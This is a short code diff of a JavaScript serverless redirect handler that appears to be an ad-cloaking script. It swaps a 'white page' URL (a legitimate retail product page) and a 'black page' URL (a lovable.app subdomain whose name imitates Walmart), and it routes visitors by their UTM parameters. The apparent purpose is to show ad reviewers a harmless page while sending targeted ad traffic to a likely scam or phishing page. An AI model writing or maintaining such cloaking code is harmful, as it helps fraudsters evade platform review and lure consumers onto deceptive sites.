@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/lionelo-kombi-kinderwagen-bianka-3-in-1-set-3in1-erschwinglicher-hochwertiger-kinderwagen-S0O8501F/";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://en.myfaktory.com/catalog/product/cushioned-high-back-kids-chair--2535/?cid=29";
+    const blackPageURL = "https://walmrrtquzzzz.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
